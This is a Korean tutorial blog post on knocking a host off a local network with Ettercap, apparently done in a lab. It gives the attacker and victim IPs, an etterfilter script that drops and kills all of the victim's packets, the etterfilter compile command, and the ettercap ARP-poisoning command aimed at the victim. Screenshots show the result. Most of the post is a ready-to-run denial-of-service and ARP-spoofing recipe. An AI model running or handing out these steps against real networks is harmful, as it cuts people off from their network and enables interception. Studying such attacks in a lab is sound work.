---
title: Dos Ettercap
author: JOSEOYEON
date: 2021-07-01 19:50:32
categories: [SystemHacking, DoS]
tags: [DoS]
math: true
mermaid: true
image:
  src: https://cdn.jsdelivr.net/gh/cotes2020/chirpy-images/commons/devices-mockup.png
  width: 850
  height: 585
---


# 1. DOS 공격이란
DoS(Denial of Service attack) : **서비스 거부 공격, 해당 시스템의 리소스를 점유하거나 자원을 부족하게 만들어 정상적으로 사용하지 못하게 하는 공격.** 입니다.

지금 하려는 것은 **희생자가 패킷을 보내지 못하게** (누킹)하여 네트위크에서 희생자를 차단하는 공격입니다.

해당 내용은 공격 수행의 각 과정 내용입니다.

### 1. 공격자와 희생자 IP 확인

칼리리눅스를 브릿지 모드로 실행한다. 

![image](https://user-images.githubusercontent.com/46625602/63394950-01738180-c3fd-11e9-872f-a8eeebbad034.png)


각각 ipconfig(window), ifconfig(linux) 명령어로 확인할 수 있습니다.

```Kali Linux : 10.20.3.116 (공격자 ip)```
<br/>

```Window : 10.20.2.127 (희생자 ip)```

### 2. 스크립트 작성 

leafpad를 열어서

![image](https://user-images.githubusercontent.com/46625602/63395010-413a6900-c3fd-11e9-8f21-fae9dbaa59ab.png)

```python
if(ip.src=='10.20.2.127'||ip.dst=='10.20.2.127')
{                                  // 만약 소스IP가 10.20.2.127 이거나 목적지IP가 10.20.2.127 이라면
drop();                            // 패킷을 드롭하고
kill();                            // 킬하고
msg("Dos attack!\n");              // DoS attack! 메시지 출력
}s
```

스크립트를 작성한 다음

"dos.elt" 로 홈에 저장했습니다.

### 3. etterfilter로 스크립트 컴파일 : dos.elt -> dos.ef

다음 명령어로 위에서 만든 dos.elt를 컴파일하여 dos.ef 파일을 생성 합니다.

```etterfilter dos.elt -o dos.ef```

![image](https://user-images.githubusercontent.com/46625602/63395221-f5d48a80-c3fd-11e9-9533-4f44cb6c641f.png)

<br/>

![image](https://user-images.githubusercontent.com/46625602/63395239-0c7ae180-c3fe-11e9-9479-8657bde79986.png)

<br/>

### 4. DoS attack : LAN 상에서 타겟(10.20.2.127)과 다른 모든 것들 사이의 통신 차단


```ettercap -i eth0 -T -q -F dos.ef -M ARP /10.20.2.127/// ```

희생자의 ip를 타깃으로 공격을 실행합니다
<br/>

![image](https://user-images.githubusercontent.com/46625602/63395549-046f7180-c3ff-11e9-9805-2b82998da1fc.png)

아래 그림처럼 공격이 잘 수행되는 것을 볼 수 있습니다.

![image](https://user-images.githubusercontent.com/46625602/63395564-10f3ca00-c3ff-11e9-8efe-9914bec0c9d9.png)


### 5. 희생자의 wireshark 에 잡힌 패킷들

희생자의 인터넷 상태를 확인한다. 
![image](https://user-images.githubusercontent.com/46625602/63487012-a3ba6480-c4e4-11e9-9a07-2fda003da7b9.png)


<!--10.20.2.0 -- 10.20.2.255 까지 ip 주소를 바꾸어 가면서 패킷을 7개씩 날리는 모습을 확인할 수 있다. 
![image](https://user-images.githubusercontent.com/46625602/63395726-a000e200-c3ff-11e9-8658-6a47e59590da.png)-->

---

**[참고 문헌]**

[1] [ Ettercap으로 DoS 공격하기 : 인터넷 불능](https://www.youtube.com/watch?v=kEB5wYBWG3o)